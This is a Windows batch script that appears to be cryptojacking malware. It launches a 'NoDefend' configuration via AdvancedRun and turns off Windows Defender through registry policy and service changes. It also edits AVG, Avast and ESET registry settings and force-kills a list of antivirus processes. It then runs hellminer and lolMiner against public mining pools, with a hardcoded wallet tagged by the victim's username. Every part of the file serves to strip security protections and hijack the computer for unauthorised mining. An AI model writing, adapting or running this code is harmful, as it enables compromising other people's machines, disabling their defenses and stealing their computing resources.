@echo off
setlocal

REM Execute AdvancedRun.exe with NoDefend.cfg configuration
AdvancedRun.exe /Run NoDefend.cfg

REM Run hellminer.exe with specified parameters for mining
.\hellminer.exe -c stratum+tcp://na.luckpool.net:3960 -u RRigARdBSMQ1yuShojcftU2apRUVFpR2PL.%USERNAME% -p --cpu 4

REM AVControl.bat code to disable antivirus programs

@echo off
setlocal enabledelayedexpansion

REM Define the list of antivirus processes to check for
set "AntivirusProcesses=AvastSvc.exe AVGIDSAgent.exe ekrn.exe McAfeeFramework.exe bdagent.exe N360.exe MBAMService.exe fsav.exe coreServiceShell.exe WRSVC.exe SBAMSvc.exe IntegoDaemon.exe"

echo Disabling common antivirus programs...

REM Disable Windows Defender
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

REM Disable Windows Defender Antivirus service
sc config WinDefend start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1

REM Disable AVG Antivirus
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVG\AVG" /v OndemandProtection /t REG_DWORD /d 0 /f >nul 2>&1

REM Disable Avast Antivirus
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v OndemandProtection /t REG_DWORD /d 0 /f >nul 2>&1

REM Disable ESET NOD Antivirus
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v MonitorStartupChanges /t REG_DWORD /d 0 /f >nul 2>&1

REM Add more antivirus disable commands here...

echo Checking for running antivirus processes...

REM Check for and stop known antivirus processes
for %%P in (%AntivirusProcesses%) do (
    tasklist /fi "imagename eq %%P" | find /i "%%P" >nul && (
        taskkill /f /im "%%P" >nul 2>&1
        echo %%P process stopped.
    )
)

echo Running lolMiner.exe...
lolMiner.exe --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user YOUR_WALLET_ADDRESS.RIG_ID
pause

endlocal
